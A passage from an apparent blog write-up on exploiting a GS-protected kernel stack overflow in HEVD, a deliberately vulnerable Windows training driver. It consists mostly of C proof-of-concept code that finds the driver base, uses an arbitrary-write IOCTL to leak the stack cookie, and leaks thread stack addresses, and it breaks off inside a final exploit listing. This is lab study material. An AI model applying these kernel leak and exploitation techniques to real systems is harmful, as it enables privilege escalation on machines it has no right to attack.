+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Write-What-Where */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _WRITE_WHAT_WHERE
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhat;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>ullpWhere;
+</span></span><span style="display:flex;"><span>} WRITE_WHAT_WHERE, <span style="color:#f92672">*</span>PWRITE_WHAT_WHERE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit Settings */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define ALLOCATION_SIZE 0x900
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GenerateExploitBuffer():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */</span>
+</span></span><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">GenerateExploitBuffer</span>(LPVOID lpvNt, LPVOID lpvBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>payload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)lpvBuffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> ALLOCATION_SIZE; i <span style="color:#f92672">+=</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">uint64_t</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>payload<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41414141</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> i;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* WriteBytes():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Arbitrary write located in the TriggerArbitraryWrite() function */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteBytes</span>(HANDLE hHEVD, <span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span> u64What, <span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span> u64Where)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  WRITE_WHAT_WHERE www <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  www.ullpWhere <span style="color:#f92672">=</span> u64Where;
+</span></span><span style="display:flex;"><span>  www.ullpWhat <span style="color:#f92672">=</span> u64What;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Writing 0x%p to 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, www.ullpWhat, www.ullpWhere);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  ARBITRARY_WRITE_IOCTL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>www,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(WRITE_WHAT_WHERE),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* LeakCookie():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Leverage the ARBITRARY_WRITE_IOCTL to write to our variable in Userland from
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Kernel Land. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">LeakCookie</span>(HANDLE hHEVD, LPVOID lpvHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> cookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>pu64Cookie <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvHEVD <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[*] Cookie located @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pu64Cookie);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">WriteBytes</span>(hHEVD, pu64Cookie, <span style="color:#f92672">&amp;</span>cookie);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">[+] Cookie leaked: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, cookie);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> cookie;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Stack Overflow (GS) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> cookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  DWORD dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAlloc <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvHEVD <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Base address of HEVD @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Attempting to leak __security_cookie</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">LeakCookie</span>(hHEVD, lpvHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span>snip<span style="color:#f92672">---</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once launched, we successfully leaked the stack cookie!</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/w00t1.png" alt="alt text"></p>
+<p>However, we still need to leak the stack&hellip; I was pretty stuck&hellip; until I came across another great post by <a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">Kristal-G</a> where the use of a leak from <a href="https://github.com/sam-b/windows_kernel_address_leaks/tree/3810bec445c0afaa4e23338241ba0359aea398d1">sam-b</a> came in handy.</p>
+<p>Let&rsquo;s once again code this and test it!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">LeakStack</span>(<span style="color:#66d9ef">wchar_t</span> <span style="color:#f92672">*</span>targetPoC)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HMODULE ntdll <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetModuleHandle</span>(<span style="color:#a6e22e">TEXT</span>(<span style="color:#e6db74">&#34;ntdll&#34;</span>));
+</span></span><span style="display:flex;"><span>  PNtQuerySystemInformation query <span style="color:#f92672">=</span> (PNtQuerySystemInformation)<span style="color:#a6e22e">GetProcAddress</span>(ntdll, <span style="color:#e6db74">&#34;NtQuerySystemInformation&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (query <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;GetProcAddress() failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ULONG len <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>;
+</span></span><span style="display:flex;"><span>  NTSTATUS status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>  PSYSTEM_EXTENDED_PROCESS_INFORMATION pProcessInfo <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    len <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>    pProcessInfo <span style="color:#f92672">=</span> (PSYSTEM_EXTENDED_PROCESS_INFORMATION)<span style="color:#a6e22e">GlobalAlloc</span>(GMEM_ZEROINIT, len);
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>(SystemExtendedProcessInformation, pProcessInfo, len, <span style="color:#f92672">&amp;</span>len);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (status <span style="color:#f92672">==</span> (NTSTATUS)<span style="color:#ae81ff">0xc0000004</span>);
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (status <span style="color:#f92672">!=</span> (NTSTATUS)<span style="color:#ae81ff">0x0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NtQuerySystemInformation failed with error code 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, status);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Strangely I was able to do this with the pProcessInfo-&gt;ImageName.Buffer being NULL? 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrW</span>(pProcessInfo<span style="color:#f92672">-&gt;</span>ImageName.Buffer, targetPoC) <span style="color:#f92672">!=</span> NULL <span style="color:#f92672">||</span> pProcessInfo<span style="color:#f92672">-&gt;</span>ImageName.Buffer <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Leaking stack from %ls</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, targetPoC);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> pProcessInfo<span style="color:#f92672">-&gt;</span>NumberOfThreads; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        LPVOID stackBase <span style="color:#f92672">=</span> pProcessInfo<span style="color:#f92672">-&gt;</span>Threads[i].StackBase;
+</span></span><span style="display:flex;"><span>        LPVOID stackLimit <span style="color:#f92672">=</span> pProcessInfo<span style="color:#f92672">-&gt;</span>Threads[i].StackLimit;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef _WIN64
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack base 0x%p</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack limit 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, stackBase, stackLimit);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack base 0x%X</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, stackBase);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Stack limit 0x%X</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, stackLimit);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset) {
+</span></span><span style="display:flex;"><span>      pProcessInfo <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      pProcessInfo <span style="color:#f92672">=</span> (PSYSTEM_EXTENDED_PROCESS_INFORMATION)((ULONG_PTR)pProcessInfo <span style="color:#f92672">+</span> pProcessInfo<span style="color:#f92672">-&gt;</span>NextEntryOffset);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Stack Overflow (GS) */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> cookie <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  DWORD dwExploitBuffer <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  LPVOID lpvStackLeak <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvMemoryAlloc <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;HEVD&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvHEVD <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Base address of HEVD @{0x%p}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Attempting to leak __security_cookie</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">LeakCookie</span>(hHEVD, lpvHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">LeakStack</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;poc.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span><span style="color:#f92672">---</span>snip<span style="color:#f92672">---</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As you can see from our source code, we had a lot of trouble getting the target process. It was strange, basically what we ended up seeing was that the <code>pProcessInfor-&gt;ImageName.Buffer</code> needed to be NULL.</p>
+<p>We can further confirm this with GDB.</p>
+<p><img src="/0x09-Return-of-The-Stack-Overflow/stack_leak.png" alt="alt text"></p>
+<p>With that we should have everything we need to exploit this bug :)</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>Below is the final PoC code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wchar.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> LONG KPRIORITY;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _CLIENT_ID {
+</span></span><span style="display:flex;"><span>  DWORD          UniqueProcess;
+</span></span><span style="display:flex;"><span>  DWORD          UniqueThread;
+</span></span><span style="display:flex;"><span>} CLIENT_ID;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _UNICODE_STRING {
+</span></span><span style="display:flex;"><span>  USHORT Length;
+</span></span><span style="display:flex;"><span>  USHORT MaximumLength;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef MIDL_PASS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  [<span style="color:#a6e22e">size_is</span>(MaximumLength <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>), <span style="color:#a6e22e">length_is</span>((Length) <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>) ] USHORT <span style="color:#f92672">*</span> Buffer;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#else </span><span style="color:#75715e">// MIDL_PASS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">_Field_size_bytes_part_opt_</span>(MaximumLength, Length) PWCH   Buffer;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif </span><span style="color:#75715e">// MIDL_PASS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} UNICODE_STRING;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> UNICODE_STRING <span style="color:#f92672">*</span>PUNICODE_STRING;
